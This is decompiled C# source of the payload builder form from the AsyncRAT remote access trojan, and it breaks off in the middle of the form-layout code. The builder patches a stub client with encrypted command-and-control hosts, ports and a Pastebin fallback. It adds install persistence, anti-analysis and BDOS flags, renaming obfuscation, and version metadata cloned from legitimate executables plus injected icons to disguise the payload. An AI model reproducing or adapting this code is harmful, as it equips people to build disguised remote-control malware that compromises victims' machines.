// Decompiled with JetBrains decompiler
// Type: Server.Forms.FormBuilder
// Assembly: AsyncRAT, Version=0.5.7.0, Culture=neutral, PublicKeyToken=null
// MVID: 51786A10-CF9D-455B-B8A4-B82CB9EDE322
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Alien.gen-bb1f2c2c9b279790b67eaea6ab0bbce3a4d4432bbe1bd716750f2f9ba3337f7e.exe

using dnlib.DotNet;
using dnlib.DotNet.Emit;
using Server.Algorithm;
using Server.Helper;
using Server.Properties;
using Server.RenamingObfuscation;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Toolbelt.Drawing;
using Vestris.ResourceLib;

namespace Server.Forms
{
  public class FormBuilder : Form
  {
    private readonly Random random = new Random();
    private const string alphabet = "asdfghjklqwertyuiopmnbvcxz";
    private IContainer components;
    private GroupBox groupBox1;
    private Label label2;
    private GroupBox groupBox2;
    private TextBox textFilename;
    private Label label3;
    private Label label4;
    private CheckBox checkBox1;
    private ComboBox comboBoxFolder;
    private GroupBox groupBox3;
    private CheckBox chkAnti;
    private TextBox txtMutex;
    private Label label5;
    private TextBox txtPastebin;
    private CheckBox chkPastebin;
    private Label label6;
    private ToolTip toolTip1;
    private TabControl tabControl1;
    private TabPage tabPage1;
    private TabPage tabPage2;
    private TabPage tabPage3;
    private CheckBox chkBdos;
    private PictureBox pictureBox1;
    private ListBox listBoxPort;
    private TextBox textPort;
    private Button btnAddPort;
    private Button btnRemovePort;
    private Button btnRemoveIP;
    private Button btnAddIP;
    private ListBox listBoxIP;
    private TextBox textIP;
    private Label label1;
    private TabPage tabPage4;
    private GroupBox groupBox4;
    private TextBox txtFileVersion;
    private TextBox txtProductVersion;
    private TextBox txtOriginalFilename;
    private TextBox txtTrademarks;
    private TextBox txtCopyright;
    private TextBox txtCompany;
    private Label label14;
    private Label label13;
    private Label label12;
    private Label label11;
    private Label label10;
    private Label label9;
    private TextBox txtDescription;
    private Label label7;
    private TextBox txtProduct;
    private Label label8;
    private TabPage tabPage5;
    private GroupBox groupBox5;
    private Label label15;
    private TextBox txtIcon;
    private PictureBox picIcon;
    private CheckBox chkIcon;
    private CheckBox btnAssembly;
    private TabPage tabPage6;
    private Button btnBuild;
    private CheckBox chkObfu;
    private Button btnClone;
    private Button btnIcon;
    private NumericUpDown numDelay;
    private Label label16;
    private TextBox txtGroup;
    private Label label17;

    public FormBuilder() => this.InitializeComponent();

    private void SaveSettings()
    {
      try
      {
        List<string> values1 = new List<string>();
        foreach (string str in this.listBoxPort.Items)
          values1.Add(str);
        Server.Properties.Settings.Default.Ports = string.Join(",", (IEnumerable<string>) values1);
        List<string> values2 = new List<string>();
        foreach (string str in this.listBoxIP.Items)
          values2.Add(str);
        Server.Properties.Settings.Default.IP = string.Join(",", (IEnumerable<string>) values2);
        Server.Properties.Settings.Default.Save();
      }
      catch
      {
      }
    }

    private void checkBox1_CheckedChanged(object sender, EventArgs e)
    {
      if (this.checkBox1.Checked)
      {
        this.checkBox1.Text = "ON";
        this.textFilename.Enabled = true;
        this.comboBoxFolder.Enabled = true;
      }
      else
      {
        this.checkBox1.Text = "OFF";
        this.textFilename.Enabled = false;
        this.comboBoxFolder.Enabled = false;
      }
    }

    private void Builder_Load(object sender, EventArgs e)
    {
      this.comboBoxFolder.SelectedIndex = 0;
      if (Server.Properties.Settings.Default.IP.Length == 0)
        this.listBoxIP.Items.Add((object) "127.0.0.1");
      if (Server.Properties.Settings.Default.Pastebin.Length == 0)
        this.txtPastebin.Text = "https://pastebin.com/raw/s14cUU5G";
      try
      {
        string ports = Server.Properties.Settings.Default.Ports;
        string[] separator = new string[1]{ "," };
        foreach (string str in ports.Split(separator, StringSplitOptions.None))
        {
          if (!string.IsNullOrWhiteSpace(str))
            this.listBoxPort.Items.Add((object) str.Trim());
        }
      }
      catch
      {
      }
      try
      {
        string ip = Server.Properties.Settings.Default.IP;
        string[] separator = new string[1]{ "," };
        foreach (string str in ip.Split(separator, StringSplitOptions.None))
        {
          if (!string.IsNullOrWhiteSpace(str))
            this.listBoxIP.Items.Add((object) str.Trim());
        }
      }
      catch
      {
      }
      if (Server.Properties.Settings.Default.Mutex.Length != 0)
        return;
      this.txtMutex.Text = this.getRandomCharacters();
    }

    private void CheckBox2_CheckedChanged(object sender, EventArgs e)
    {
      if (this.chkPastebin.Checked)
      {
        this.txtPastebin.Enabled = true;
        this.textIP.Enabled = false;
        this.textPort.Enabled = false;
        this.listBoxIP.Enabled = false;
        this.listBoxPort.Enabled = false;
        this.btnAddIP.Enabled = false;
        this.btnAddPort.Enabled = false;
        this.btnRemoveIP.Enabled = false;
        this.btnRemovePort.Enabled = false;
      }
      else
      {
        this.txtPastebin.Enabled = false;
        this.textIP.Enabled = true;
        this.textPort.Enabled = true;
        this.listBoxIP.Enabled = true;
        this.listBoxPort.Enabled = true;
        this.btnAddIP.Enabled = true;
        this.btnAddPort.Enabled = true;
        this.btnRemoveIP.Enabled = true;
        this.btnRemovePort.Enabled = true;
      }
    }

    private void BtnRemovePort_Click(object sender, EventArgs e)
    {
      if (this.listBoxPort.SelectedItems.Count != 1)
        return;
      this.listBoxPort.Items.Remove(this.listBoxPort.SelectedItem);
    }

    private void BtnAddPort_Click(object sender, EventArgs e)
    {
      try
      {
        Convert.ToInt32(this.textPort.Text.Trim());
        foreach (string str in this.listBoxPort.Items)
        {
          if (str.Equals(this.textPort.Text.Trim()))
            return;
        }
        this.listBoxPort.Items.Add((object) this.textPort.Text.Trim());
        this.textPort.Clear();
      }
      catch
      {
      }
    }

    private void BtnRemoveIP_Click(object sender, EventArgs e)
    {
      if (this.listBoxIP.SelectedItems.Count != 1)
        return;
      this.listBoxIP.Items.Remove(this.listBoxIP.SelectedItem);
    }

    private void BtnAddIP_Click(object sender, EventArgs e)
    {
      try
      {
        foreach (string str in this.listBoxIP.Items)
        {
          this.textIP.Text = this.textIP.Text.Replace(" ", "");
          string text = this.textIP.Text;
          if (str.Equals(text))
            return;
        }
        this.listBoxIP.Items.Add((object) this.textIP.Text.Replace(" ", ""));
        this.textIP.Clear();
      }
      catch
      {
      }
    }

    private async void BtnBuild_Click(object sender, EventArgs e)
    {
      FormBuilder formBuilder = this;
      if (!formBuilder.chkPastebin.Checked && formBuilder.listBoxIP.Items.Count == 0)
        ;
      else if (formBuilder.listBoxPort.Items.Count == 0)
        ;
      else
      {
        if (formBuilder.checkBox1.Checked)
        {
          if (string.IsNullOrWhiteSpace(formBuilder.textFilename.Text))
            return;
          if (string.IsNullOrWhiteSpace(formBuilder.comboBoxFolder.Text))
            return;
          if (!formBuilder.textFilename.Text.EndsWith("exe"))
            formBuilder.textFilename.Text += ".exe";
        }
        if (string.IsNullOrWhiteSpace(formBuilder.txtGroup.Text))
          formBuilder.txtGroup.Text = "Default";
        if (formBuilder.chkPastebin.Checked && string.IsNullOrWhiteSpace(formBuilder.txtPastebin.Text))
          ;
        else
        {
          ModuleDefMD asmDef = (ModuleDefMD) null;
          try
          {
            using (asmDef = ModuleDefMD.Load("Stub/Stub.exe", (ModuleCreationOptions) null))
            {
              using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
              {
                saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
                saveFileDialog1.InitialDirectory = Application.StartupPath;
                saveFileDialog1.OverwritePrompt = false;
                saveFileDialog1.FileName = "AsyncClient";
                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                  formBuilder.btnBuild.Enabled = false;
                  formBuilder.WriteSettings(asmDef, saveFileDialog1.FileName);
                  if (formBuilder.chkObfu.Checked)
                    await Task.Run((Action) (() => Renaming.DoRenaming(asmDef)));
                  ((ModuleDef) asmDef).Write(saveFileDialog1.FileName);
                  ((ModuleDef) asmDef).Dispose();
                  if (formBuilder.btnAssembly.Checked)
                    formBuilder.WriteAssembly(saveFileDialog1.FileName);
                  if (formBuilder.chkIcon.Checked && !string.IsNullOrEmpty(formBuilder.txtIcon.Text))
                    IconInjector.InjectIcon(saveFileDialog1.FileName, formBuilder.txtIcon.Text);
                  int num = (int) MessageBox.Show("Done!", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                  formBuilder.SaveSettings();
                  formBuilder.Close();
                }
              }
            }
          }
          catch (Exception ex)
          {
            int num = (int) MessageBox.Show(ex.Message, "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Hand);
            ((ModuleDef) asmDef)?.Dispose();
            formBuilder.btnBuild.Enabled = true;
          }
        }
      }
    }

    private void WriteAssembly(string filename)
    {
      try
      {
        VersionResource versionResource = new VersionResource();
        ((Resource) versionResource).LoadFrom(filename);
        versionResource.FileVersion = this.txtFileVersion.Text;
        versionResource.ProductVersion = this.txtProductVersion.Text;
        ((Resource) versionResource).Language = (ushort) 0;
        StringFileInfo stringFileInfo = (StringFileInfo) versionResource["StringFileInfo"];
        stringFileInfo["ProductName"] = this.txtProduct.Text;
        stringFileInfo["FileDescription"] = this.txtDescription.Text;
        stringFileInfo["CompanyName"] = this.txtCompany.Text;
        stringFileInfo["LegalCopyright"] = this.txtCopyright.Text;
        stringFileInfo["LegalTrademarks"] = this.txtTrademarks.Text;
        stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
        stringFileInfo["InternalName"] = this.txtOriginalFilename.Text;
        stringFileInfo["OriginalFilename"] = this.txtOriginalFilename.Text;
        stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
        stringFileInfo["FileVersion"] = versionResource.FileVersion;
        ((Resource) versionResource).SaveTo(filename);
      }
      catch (Exception ex)
      {
        throw new ArgumentException("Assembly: " + ex.Message);
      }
    }

    private void BtnAssembly_CheckedChanged(object sender, EventArgs e)
    {
      if (this.btnAssembly.Checked)
      {
        this.btnClone.Enabled = true;
        this.txtProduct.Enabled = true;
        this.txtDescription.Enabled = true;
        this.txtCompany.Enabled = true;
        this.txtCopyright.Enabled = true;
        this.txtTrademarks.Enabled = true;
        this.txtOriginalFilename.Enabled = true;
        this.txtOriginalFilename.Enabled = true;
        this.txtProductVersion.Enabled = true;
        this.txtFileVersion.Enabled = true;
      }
      else
      {
        this.btnClone.Enabled = false;
        this.txtProduct.Enabled = false;
        this.txtDescription.Enabled = false;
        this.txtCompany.Enabled = false;
        this.txtCopyright.Enabled = false;
        this.txtTrademarks.Enabled = false;
        this.txtOriginalFilename.Enabled = false;
        this.txtOriginalFilename.Enabled = false;
        this.txtProductVersion.Enabled = false;
        this.txtFileVersion.Enabled = false;
      }
    }

    private void ChkIcon_CheckedChanged(object sender, EventArgs e)
    {
      if (this.chkIcon.Checked)
      {
        this.txtIcon.Enabled = true;
        this.btnIcon.Enabled = true;
      }
      else
      {
        this.txtIcon.Enabled = false;
        this.btnIcon.Enabled = false;
      }
    }

    private void BtnIcon_Click(object sender, EventArgs e)
    {
      using (OpenFileDialog openFileDialog = new OpenFileDialog())
      {
        openFileDialog.Title = "Choose Icon";
        openFileDialog.Filter = "Icons Files(*.exe;*.ico;)|*.exe;*.ico";
        openFileDialog.Multiselect = false;
        if (openFileDialog.ShowDialog() != DialogResult.OK)
          return;
        if (openFileDialog.FileName.ToLower().EndsWith(".exe"))
        {
          string icon = this.GetIcon(openFileDialog.FileName);
          this.txtIcon.Text = icon;
          this.picIcon.ImageLocation = icon;
        }
        else
        {
          this.txtIcon.Text = openFileDialog.FileName;
          this.picIcon.ImageLocation = openFileDialog.FileName;
        }
      }
    }

    private string GetIcon(string path)
    {
      try
      {
        string path1 = Path.GetTempFileName() + ".ico";
        using (FileStream fileStream = new FileStream(path1, FileMode.Create))
          IconExtractor.Extract1stIconTo(path, (Stream) fileStream);
        return path1;
      }
      catch
      {
      }
      return "";
    }

    private void WriteSettings(ModuleDefMD asmDef, string AsmName)
    {
      try
      {
        string randomString = Methods.GetRandomString(32);
        Aes256 aes256 = new Aes256(randomString);
        X509Certificate2 x509Certificate2_1 = new X509Certificate2(Server.Settings.CertificatePath, "", X509KeyStorageFlags.Exportable);
        X509Certificate2 x509Certificate2_2 = new X509Certificate2(x509Certificate2_1.Export(X509ContentType.Cert));
        byte[] inArray;
        using (RSACryptoServiceProvider privateKey = (RSACryptoServiceProvider) x509Certificate2_1.PrivateKey)
        {
          byte[] hash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(randomString));
          inArray = privateKey.SignHash(hash, CryptoConfig.MapNameToOID("SHA256"));
        }
        foreach (TypeDef type in (IEnumerable<TypeDef>) ((ModuleDef) asmDef).Types)
        {
          ((ModuleDef) asmDef).Assembly.Name = UTF8String.op_Implicit(Path.GetFileNameWithoutExtension(AsmName));
          ((ModuleDef) asmDef).Name = UTF8String.op_Implicit(Path.GetFileName(AsmName));
          if (UTF8String.op_Equality(type.Name, "Settings"))
          {
            foreach (MethodDef method in (IEnumerable<MethodDef>) type.Methods)
            {
              if (method.Body != null)
              {
                for (int index = 0; index < ((IEnumerable<Instruction>) method.Body.Instructions).Count<Instruction>(); ++index)
                {
                  if (method.Body.Instructions[index].OpCode == OpCodes.Ldstr)
                  {
                    if (method.Body.Instructions[index].Operand.ToString() == "%Ports%")
                    {
                      if (this.chkPastebin.Enabled && this.chkPastebin.Checked)
                      {
                        method.Body.Instructions[index].Operand = (object) aes256.Encrypt("null");
                      }
                      else
                      {
                        List<string> values = new List<string>();
                        foreach (string str in this.listBoxPort.Items)
                          values.Add(str);
                        method.Body.Instructions[index].Operand = (object) aes256.Encrypt(string.Join(",", (IEnumerable<string>) values));
                      }
                    }
                    if (method.Body.Instructions[index].Operand.ToString() == "%Hosts%")
                    {
                      if (this.chkPastebin.Enabled && this.chkPastebin.Checked)
                      {
                        method.Body.Instructions[index].Operand = (object) aes256.Encrypt("null");
                      }
                      else
                      {
                        List<string> values = new List<string>();
                        foreach (string str in this.listBoxIP.Items)
                          values.Add(str);
                        method.Body.Instructions[index].Operand = (object) aes256.Encrypt(string.Join(",", (IEnumerable<string>) values));
                      }
                    }
                    if (method.Body.Instructions[index].Operand.ToString() == "%Install%")
                      method.Body.Instructions[index].Operand = (object) aes256.Encrypt(this.checkBox1.Checked.ToString().ToLower());
                    if (method.Body.Instructions[index].Operand.ToString() == "%Folder%")
                      method.Body.Instructions[index].Operand = (object) this.comboBoxFolder.Text;
                    if (method.Body.Instructions[index].Operand.ToString() == "%File%")
                      method.Body.Instructions[index].Operand = (object) this.textFilename.Text;
                    if (method.Body.Instructions[index].Operand.ToString() == "%Version%")
                      method.Body.Instructions[index].Operand = (object) aes256.Encrypt(Server.Settings.Version.Replace("AsyncRAT ", ""));
                    if (method.Body.Instructions[index].Operand.ToString() == "%Key%")
                      method.Body.Instructions[index].Operand = (object) Convert.ToBase64String(Encoding.UTF8.GetBytes(randomString));
                    if (method.Body.Instructions[index].Operand.ToString() == "%MTX%")
                      method.Body.Instructions[index].Operand = !string.IsNullOrWhiteSpace(this.txtMutex.Text) ? (object) aes256.Encrypt(this.txtMutex.Text) : (object) this.getRandomCharacters();
                    if (method.Body.Instructions[index].Operand.ToString() == "%Anti%")
                      method.Body.Instructions[index].Operand = (object) aes256.Encrypt(this.chkAnti.Checked.ToString().ToLower());
                    if (method.Body.Instructions[index].Operand.ToString() == "%Certificate%")
                      method.Body.Instructions[index].Operand = (object) aes256.Encrypt(Convert.ToBase64String(x509Certificate2_2.Export(X509ContentType.Cert)));
                    if (method.Body.Instructions[index].Operand.ToString() == "%Serversignature%")
                      method.Body.Instructions[index].Operand = (object) aes256.Encrypt(Convert.ToBase64String(inArray));
                    if (method.Body.Instructions[index].Operand.ToString() == "%BDOS%")
                      method.Body.Instructions[index].Operand = (object) aes256.Encrypt(this.chkBdos.Checked.ToString().ToLower());
                    if (method.Body.Instructions[index].Operand.ToString() == "%Pastebin%")
                      method.Body.Instructions[index].Operand = !this.chkPastebin.Checked ? (object) aes256.Encrypt("null") : (object) aes256.Encrypt(this.txtPastebin.Text);
                    if (method.Body.Instructions[index].Operand.ToString() == "%Delay%")
                      method.Body.Instructions[index].Operand = (object) this.numDelay.Value.ToString();
                    if (method.Body.Instructions[index].Operand.ToString() == "%Group%")
                      method.Body.Instructions[index].Operand = (object) aes256.Encrypt(this.txtGroup.Text);
                  }
                }
              }
            }
          }
        }
      }
      catch (Exception ex)
      {
        throw new ArgumentException("WriteSettings: " + ex.Message);
      }
    }

    public string getRandomCharacters()
    {
      StringBuilder stringBuilder = new StringBuilder();
      for (int index1 = 1; index1 <= new Random().Next(10, 20); ++index1)
      {
        int index2 = this.random.Next(0, "asdfghjklqwertyuiopmnbvcxz".Length);
        stringBuilder.Append("asdfghjklqwertyuiopmnbvcxz"[index2]);
      }
      return stringBuilder.ToString();
    }

    private void BtnClone_Click(object sender, EventArgs e)
    {
      using (OpenFileDialog openFileDialog = new OpenFileDialog())
      {
        openFileDialog.Filter = "Executable (*.exe)|*.exe";
        if (openFileDialog.ShowDialog() != DialogResult.OK)
          return;
        FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);
        this.txtOriginalFilename.Text = versionInfo.InternalName ?? string.Empty;
        this.txtDescription.Text = versionInfo.FileDescription ?? string.Empty;
        this.txtCompany.Text = versionInfo.CompanyName ?? string.Empty;
        this.txtProduct.Text = versionInfo.ProductName ?? string.Empty;
        this.txtCopyright.Text = versionInfo.LegalCopyright ?? string.Empty;
        this.txtTrademarks.Text = versionInfo.LegalTrademarks ?? string.Empty;
        int fileMajorPart = versionInfo.FileMajorPart;
        this.txtFileVersion.Text = versionInfo.FileMajorPart.ToString() + "." + versionInfo.FileMinorPart.ToString() + "." + versionInfo.FileBuildPart.ToString() + "." + versionInfo.FilePrivatePart.ToString();
        this.txtProductVersion.Text = versionInfo.FileMajorPart.ToString() + "." + versionInfo.FileMinorPart.ToString() + "." + versionInfo.FileBuildPart.ToString() + "." + versionInfo.FilePrivatePart.ToString();
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (FormBuilder));
      this.groupBox1 = new GroupBox();
      this.btnRemoveIP = new Button();
      this.btnAddIP = new Button();
      this.listBoxIP = new ListBox();
      this.textIP = new TextBox();
      this.label1 = new Label();
      this.btnRemovePort = new Button();
      this.btnAddPort = new Button();
      this.listBoxPort = new ListBox();
      this.chkPastebin = new CheckBox();
      this.txtPastebin = new TextBox();
      this.label6 = new Label();
      this.textPort = new TextBox();
      this.label2 = new Label();
      this.groupBox2 = new GroupBox();
      this.comboBoxFolder = new ComboBox();
      this.checkBox1 = new CheckBox();
      this.textFilename = new TextBox();
      this.label3 = new Label();
      this.label4 = new Label();
      this.groupBox3 = new GroupBox();
      this.txtGroup = new TextBox();
      this.label17 = new Label();
      this.numDelay = new NumericUpDown();
      this.label16 = new Label();
      this.pictureBox1 = new PictureBox();
      this.chkBdos = new CheckBox();
      this.txtMutex = new TextBox();
      this.label5 = new Label();
      this.chkAnti = new CheckBox();
      this.toolTip1 = new ToolTip(this.components);
      this.tabControl1 = new TabControl();
      this.tabPage1 = new TabPage();
      this.tabPage2 = new TabPage();
      this.tabPage3 = new TabPage();
      this.tabPage4 = new TabPage();
      this.groupBox4 = new GroupBox();
      this.btnClone = new Button();
      this.btnAssembly = new CheckBox();
      this.txtFileVersion = new TextBox();
      this.txtProductVersion = new TextBox();
      this.txtOriginalFilename = new TextBox();
      this.txtTrademarks = new TextBox();
      this.txtCopyright = new TextBox();
      this.txtCompany = new TextBox();
      this.label14 = new Label();
      this.label13 = new Label();
      this.label12 = new Label();
      this.label11 = new Label();
      this.label10 = new Label();
      this.label9 = new Label();
      this.txtDescription = new TextBox();
      this.label7 = new Label();
      this.txtProduct = new TextBox();
      this.label8 = new Label();
      this.tabPage5 = new TabPage();
      this.groupBox5 = new GroupBox();
      this.chkIcon = new CheckBox();
      this.label15 = new Label();
      this.txtIcon = new TextBox();
      this.btnIcon = new Button();
      this.picIcon = new PictureBox();
      this.tabPage6 = new TabPage();
      this.chkObfu = new CheckBox();
      this.btnBuild = new Button();
      this.groupBox1.SuspendLayout();
      this.groupBox2.SuspendLayout();
      this.groupBox3.SuspendLayout();
      this.numDelay.BeginInit();
      ((ISupportInitialize) this.pictureBox1).BeginInit();
      this.tabControl1.SuspendLayout();
      this.tabPage1.SuspendLayout();
      this.tabPage2.SuspendLayout();
      this.tabPage3.SuspendLayout();
      this.tabPage4.SuspendLayout();
      this.groupBox4.SuspendLayout();
      this.tabPage5.SuspendLayout();
      this.groupBox5.SuspendLayout();
      ((ISupportInitialize) this.picIcon).BeginInit();
      this.tabPage6.SuspendLayout();
      this.SuspendLayout();
      this.groupBox1.Controls.Add((Control) this.btnRemoveIP);
      this.groupBox1.Controls.Add((Control) this.btnAddIP);
      this.groupBox1.Controls.Add((Control) this.listBoxIP);
      this.groupBox1.Controls.Add((Control) this.textIP);
      this.groupBox1.Controls.Add((Control) this.label1);
      this.groupBox1.Controls.Add((Control) this.btnRemovePort);
      this.groupBox1.Controls.Add((Control) this.btnAddPort);
      this.groupBox1.Controls.Add((Control) this.listBoxPort);
      this.groupBox1.Controls.Add((Control) this.chkPastebin);
      this.groupBox1.Controls.Add((Control) this.txtPastebin);
      this.groupBox1.Controls.Add((Control) this.label6);
      this.groupBox1.Controls.Add((Control) this.textPort);
      this.groupBox1.Controls.Add((Control) this.label2);
      this.groupBox1.Location = new Point(6, 19);
      this.groupBox1.Name = "groupBox1";
      this.groupBox1.Size = new Size(587, 437);
      this.groupBox1.TabIndex = 1;
      this.groupBox1.TabStop = false;
      this.groupBox1.Text = "Connection";
      this.btnRemoveIP.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.btnRemoveIP.Location = new Point(190, 156);
      this.btnRemoveIP.Name = "btnRemoveIP";
      this.btnRemoveIP.Size = new Size(43, 26);
      this.btnRemoveIP.TabIndex = 18;
      this.btnRemoveIP.Text = "-";
      this.btnRemoveIP.UseVisualStyleBackColor = true;
      this.btnRemoveIP.Click += new EventHandler(this.BtnRemoveIP_Click);
      this.btnAddIP.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.btnAddIP.Location = new Point(72, 156);
      this.btnAddIP.Name = "btnAddIP";
      this.btnAddIP.Size = new Size(43, 26);
      this.btnAddIP.TabIndex = 17;
      this.btnAddIP.Text = "+";
      this.btnAddIP.UseVisualStyleBackColor = true;
      this.btnAddIP.Click += new EventHandler(this.BtnAddIP_Click);
      this.listBoxIP.FormattingEnabled = true;
      this.listBoxIP.ItemHeight = 20;
      this.listBoxIP.Location = new Point(72, 66);
      this.listBoxIP.Name = "listBoxIP";
      this.listBoxIP.Size = new Size(161, 84);
      this.listBoxIP.TabIndex = 16;
      this.textIP.Location = new Point(72, 34);
      this.textIP.Name = "textIP";
      this.textIP.Size = new Size(161, 26);
      this.textIP.TabIndex = 15;
      this.label1.AutoSize = true;
      this.label1.Location = new Point(18, 37);
      this.label1.Name = "label1";
      this.label1.Size = new Size(43, 20);
      this.label1.TabIndex = 14;
      this.label1.Text = "DNS";
      this.btnRemovePort.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.btnRemovePort.Location = new Point(480, 156);
      this.btnRemovePort.Name = "btnRemovePort";
      this.btnRemovePort.Size = new Size(43, 26);
      this.btnRemovePort.TabIndex = 13;
      this.btnRemovePort.Text = "-";
      this.btnRemovePort.UseVisualStyleBackColor = true;
      this.btnRemovePort.Click += new EventHandler(this.BtnRemovePort_Click);
      this.btnAddPort.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.btnAddPort.Location = new Point(362, 156);
      this.btnAddPort.Name = "btnAddPort";
      this.btnAddPort.Size = new Size(43, 26);
      this.btnAddPort.TabIndex = 12;
      this.btnAddPort.Text = "+";
      this.btnAddPort.UseVisualStyleBackColor = true;
      this.btnAddPort.Click += new EventHandler(this.BtnAddPort_Click);
      this.listBoxPort.FormattingEnabled = true;
      this.listBoxPort.ItemHeight = 20;
      this.listBoxPort.Location = new Point(362, 66);
      this.listBoxPort.Name = "listBoxPort";
      this.listBoxPort.Size = new Size(161, 84);
      this.listBoxPort.TabIndex = 10;
      this.chkPastebin.AutoSize = true;
      this.chkPastebin.Location = new Point(22, 307);
      this.chkPastebin.Name = "chkPastebin";
      this.chkPastebin.Size = new Size(130, 24);
      this.chkPastebin.TabIndex = 9;
      this.chkPastebin.Text = "Use Pastebin";
      this.toolTip1.SetToolTip((Control) this.chkPastebin, "IP:PORT .. Example 127.0.0.1:6606");
      this.chkPastebin.UseVisualStyleBackColor = true;
      this.chkPastebin.CheckedChanged += new EventHandler(this.CheckBox2_CheckedChanged);
      this.txtPastebin.DataBindings.Add(new Binding("Text", (object) Server.Properties.Settings.Default, "Pastebin", true, DataSourceUpdateMode.OnPropertyChanged));
      this.txtPastebin.Enabled = false;
      this.txtPastebin.Location = new Point(106, 352);
      this.txtPastebin.Name = "txtPastebin";
      this.txtPastebin.Size = new Size(271, 26);
      this.txtPastebin.TabIndex = 8;
      this.txtPastebin.Text = Server.Properties.Settings.Default.Pastebin;
      this.toolTip1.SetToolTip((Control) this.txtPastebin, "IP:PORT .. Example 127.0.0.1:6606");
      this.label6.AutoSize = true;
      this.label6.Location = new Point(14, 355);
      this.label6.Name = "label6";
      this.label6.Size = new Size(71, 20);
      this.label6.TabIndex = 7;
      this.label6.Text = "Pastebin";
      this.textPort.Location = new Point(362, 34);
      this.textPort.Name = "textPort";
      this.textPort.Size = new Size(161, 26);
      this.textPort.TabIndex = 6;
      this.label2.AutoSize = true;
      this.label2.Location = new Point(308, 37);
      this.label2.Name = "label2";
      this.label2.Size = new Size(38, 20);
      this.label2.TabIndex = 3;
      this.label2.Text = "Port";
      this.groupBox2.Controls.Add((Control) this.comboBoxFolder);
      this.groupBox2.Controls.Add((Control) this.checkBox1);
      this.groupBox2.Controls.Add((Control) this.textFilename);
      this.groupBox2.Controls.Add((Control) this.label3);
      this.groupBox2.Controls.Add((Control) this.label4);
      this.groupBox2.Location = new Point(6, 17);
      this.groupBox2.Name = "groupBox2";
      this.groupBox2.Size = new Size(585, 439);
      this.groupBox2.TabIndex = 7;
      this.groupBox2.TabStop = false;
      this.groupBox2.Text = "Install";
      this.comboBoxFolder.DropDownStyle = ComboBoxStyle.DropDownList;
      this.comboBoxFolder.Enabled = false;
      this.comboBoxFolder.FormattingEnabled = true;
      this.comboBoxFolder.Items.AddRange(new object[2]
      {
        (object) "%AppData%",
        (object) "%Temp%"
      });
      this.comboBoxFolder.Location = new Point(103, 149);
      this.comboBoxFolder.Name = "comboBoxFolder";
      this.comboBoxFolder.Size = new Size(271, 28);
      this.comboBoxFolder.TabIndex = 8;
      this.checkBox1.AutoSize = true;
      this.checkBox1.Location = new Point(15, 29);
      this.checkBox1.Name = "checkBox1";
      this.checkBox1.Size = new Size(67, 24);
      this.checkBox1.TabIndex = 7;
      this.checkBox1.Text = "OFF";
      this.checkBox1.UseVisualStyleBackColor = true;
      this.checkBox1.CheckedChanged += new EventHandler(this.checkBox1_CheckedChanged);
      this.textFilename.DataBindings.Add(new Binding("Text", (object) Server.Properties.Settings.Default, "Filename", true, DataSourceUpdateMode.OnPropertyChanged));
      this.textFilename.Enabled = false;
      this.textFilename.Location = new Point(103, 92);
      this.textFilename.Name = "textFilename";
      this.textFilename.Size = new Size(271, 26);
      this.textFilename.TabIndex = 5;
      this.textFilename.Text = Server.Properties.Settings.Default.Filename;
      this.label3.AutoSize = true;
      this.label3.Location = new Point(11, 152);
      this.label3.Name = "label3";
      this.label3.Size = new Size(54, 20);
      this.label3.TabIndex = 3;
      this.label3.Text = "Folder";
      this.label4.AutoSize = true;
      this.label4.Location = new Point(11, 95);
      this.label4.Name = "label4";
      this.label4.Size = new Size(74, 20);
      this.label4.TabIndex = 4;
      this.label4.Text = "Filename";
      this.groupBox3.Controls.Add((Control) this.txtGroup);
      this.groupBox3.Controls.Add((Control) this.label17);
      this.groupBox3.Controls.Add((Control) this.numDelay);
      this.groupBox3.Controls.Add((Control) this.label16);
      this.groupBox3.Controls.Add((Control) this.pictureBox1);
      this.groupBox3.Controls.Add((Control) this.chkBdos);
      this.groupBox3.Controls.Add((Control) this.txtMutex);
      this.groupBox3.Controls.Add((Control) this.label5);
      this.groupBox3.Controls.Add((Control) this.chkAnti);
      this.groupBox3.Location = new Point(6, 17);
      this.groupBox3.Name = "groupBox3";
      this.groupBox3.Size = new Size(585, 439);
      this.groupBox3.TabIndex = 9;
      this.groupBox3.TabStop = false;
      this.groupBox3.Text = "MISC";
      this.txtGroup.DataBindings.Add(new Binding("Text", (object) Server.Properties.Settings.Default, "Group", true, DataSourceUpdateMode.OnPropertyChanged));
      this.txtGroup.Location = new Point(23, 75);
      this.txtGroup.Name = "txtGroup";
      this.txtGroup.Size = new Size(301, 26);
      this.txtGroup.TabIndex = 17;
      this.txtGroup.Text = Server.Properties.Settings.Default.Group;
      this.label17.AutoSize = true;
      this.label17.Location = new Point(19, 43);
      this.label17.Name = "label17";
      this.label17.Size = new Size(54, 20);
      this.label17.TabIndex = 16;
      this.label17.Text = "Group";
      this.numDelay.Location = new Point(27, 368);
      this.numDelay.Maximum = new Decimal(new int[4]
      {
        999,
        0,
        0,
        0
      });
      this.numDelay.Minimum = new Decimal(new int[4]
